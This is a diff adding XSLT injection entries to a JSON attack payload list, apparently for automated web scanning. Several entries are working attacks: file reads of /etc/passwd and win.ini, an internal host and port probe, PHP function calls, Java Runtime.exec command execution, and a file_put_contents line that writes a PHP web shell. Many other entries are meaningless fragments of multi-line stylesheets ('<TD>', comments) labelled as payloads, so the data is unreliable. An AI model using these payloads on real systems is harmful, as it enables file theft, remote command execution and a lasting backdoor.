@@ -11581,5 +11581,588 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-246128",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246129",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246130",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:template match=\"/fruits\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246131",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"system-property('xsl:vendor')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246132",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246133",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<br />Version: <xsl:value-of select=\"system-property('xsl:version')\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246134",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<br />Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246135",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246136",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246138",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!-- Loop for each fruit -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246139",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:for-each select=\"fruit\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246140",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!-- Print name: description -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246142",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</xsl:for-each>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246143",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:copy-of select=\"document('http://172.16.132.1:25')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246144",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:copy-of select=\"document('/etc/passwd')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246145",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Windows",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246147",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246152",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<exploit:document href=\"evil.txt\" method=\"text\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246154",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</exploit:document>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246155",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"php:function('readfile','index.php')\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246156",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246157",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246158",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246159",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"payload\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246161",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</xsl:variable>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246162",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246163",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"eval\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246165",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246166",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246167",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246168",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246169",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246170",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"processString\" select=\"ob:toString($process)\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246171",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"$processString\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246172",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml version=\"1.0\"?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246173",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246174",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Windows",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246175",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</xsl:template>.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246176",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246177",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<msxsl:script implements-prefix=\"App\" language=\"C#\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246182",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</msxsl:script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246183",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:template match=\"ArrayOfTest\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246184",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<TABLE>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246185",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:for-each select=\"Test\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246186",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<TR>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246187",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<TD>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246188",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"App:ToShortDateString(TestDate)\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246189",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</TD>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246190",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</TR>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246191",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</TABLE>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246192",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246195",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<msxsl:script language = \"C#\" implements-prefix = \"user\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246206",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"user:execute()\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
   }
 ]
